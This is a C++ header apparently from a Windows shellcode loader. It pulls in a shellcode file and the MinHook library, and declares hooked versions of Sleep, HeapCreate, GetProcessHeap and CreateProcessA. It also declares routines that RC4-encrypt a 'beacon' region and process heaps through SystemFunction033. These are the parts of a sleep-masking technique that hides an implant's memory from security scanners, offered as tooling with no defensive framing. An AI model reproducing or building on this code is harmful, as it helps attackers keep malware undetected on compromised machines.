#pragma once
#include <Windows.h>
#include <intrin.h>
#include <tlhelp32.h>
#include <vector>
#include <bcrypt.h>
#include "Shellcode.h"
#include "minhook/MinHook.h"

#ifdef _WIN64
#pragma comment(lib,"minhook/minhook.x64.lib")
#else
#pragma comment(lib,"minhook/minhook.x86.lib")
#endif

#pragma comment(lib,"bcrypt.lib")
//#pragma comment(linker,"/subsystem:\"windows\" /entry:\"mainCRTStartup\"")

struct ustring {
    DWORD Length;
    DWORD MaximumLength;
    PUCHAR Buffer;
};

struct orgInformations
{
    PVOID BaseAddress;
    SIZE_T RegionSize;
    DWORD Protect;
};

typedef VOID(WINAPI* fnSleep)(DWORD dwMilliseconds);
typedef NTSTATUS(WINAPI* fnSystemFunction033)(struct ustring* MemoryRegion, struct ustring* KeyPointer);
typedef HANDLE(WINAPI* fnHeapCreate)(DWORD flOptions, SIZE_T dwInitialSize, SIZE_T dwMaximumSize);
typedef HANDLE(WINAPI* fnGetProcessHeap)(VOID);
typedef BOOL(WINAPI* fnCreateProcessA)(LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);

ustring g_data, g_key;
PVOID g_BeaconAddr, g_ShellcodeAddr;
HANDLE g_hNewProcessHeap;
DWORD g_dwBeaconBlocks;

BYTE g_EncryptKey[16];
orgInformations orgs[10];

VOID RandomGen();
VOID HeapEncrypt();
VOID BeaconEncrypt(BOOL fEncrypt);
VOID WINAPI MySleep(DWORD SleepTime);
HANDLE WINAPI MyGetProcessHeap();
HANDLE WINAPI MyHeapCreate(DWORD flOptions, SIZE_T dwInitialSize, SIZE_T dwMaximumSize);
BOOL WINAPI MyCreateProcessA(LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);
